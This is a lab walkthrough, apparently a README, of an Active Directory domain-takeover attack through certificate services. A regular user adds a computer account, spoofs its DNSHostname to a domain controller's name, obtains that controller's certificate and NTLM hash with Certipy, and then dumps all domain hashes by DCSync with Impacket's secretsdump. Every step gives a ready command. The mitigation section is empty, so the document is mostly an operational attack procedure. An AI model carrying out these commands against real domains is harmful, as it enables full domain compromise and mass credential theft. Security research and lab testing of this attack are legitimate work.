# The Attack In Brief
1. By default, A regular AD user can add up to 10 computers to the domain.
2. After a user adds a computer to the domain, he becomes its owner.
3. Being a computer's owner, the user can change the computers `DNSHostname` property
4. By changing this property to match a domain controller's name, we can request a certificate for it from ADCS.
5. Using the domain controller's certificate, we can obtain that computer's NTLM hash
6. with a domain controller's computer account NTLM hash, we can request a complete copy of the domain hashes a.k.a the DCSync attack

# Tools Needed
1. Certipy (https://github.com/ly4k/Certipy)
2. Impacket (https://github.com/SecureAuthCorp/impacket)

# Lab setup And Conditions
## 1. Domain Controller with ADCS Role installed [DC.LAB.Local: 192.168.126.129]
![dc-with-adcs-installed](dc-with-adcs-installed.jpg)

## 2. Kali machine [192.168.145.128]

## 3. Normal User Account (No Special Privileges)
![normal-ad-user](normal-ad-user.jpg)

# Attack Demonstration
## 1. Joining A Machine Account to The Domain with A Spoofed DNSHostname property
Command: `certipy account create <DOMAIN_FQDN>/<AD_USER>@<DC_IP> -user '<NEW_COMPUTER_NAME>' -dns <DC_FQDN>`

![creating-computer-with-spoofed-dns-hostname](creating-computer-with-spoofed-dns-hostname.jpg)

![proof-of-dns-hostname-spoofing](proof-of-dns-hostname-spoofing.jpg)

## 2. Requesting A Domain Controller's Certificate
we must first know the certificate authority's name.

This can be done by visiting the `/certsrv` web directory and authenticating:

![finding-out-the-ca-name](finding-out-the-ca-name.jpg)

Command: `certipy req -dc-ip <DC_IP> <DOMAIN_FQDN>/'<ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -ca <CA_NAME> -template Machine`
Password = same password generated from the computer creation in the previous step

![requesting-dc-cert](requesting-dc-cert.jpg)

## 3. Using the Domain Controller's Certificate To Get its NTLM Hash
Command: `certipy auth -pfx <GENERATED_PFX_CERTIFICATE>`

![got-nt-hash-for-dc](got-nt-hash-for-dc.jpg)

## 4. Performing `DCsync` As The Impersonated Domain Controller
Command: `secretsdump.py -just-dc <DOMAIN_FQDN>/'<DC_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -hashes :<RETRIEVED_HASH>`

![dc-sync-with-dc-ntlm-hash](dc-sync-with-dc-ntlm-hash.jpg)

# Technical Breakdown
1. the default AD user quota
2. the permissions for the computer certificate template
3. the granted ownership that comes with joining a machine to a domain + what we can modify
4. requesting certs
5. grabbing the NTLM hash

# mitigation

# references and credits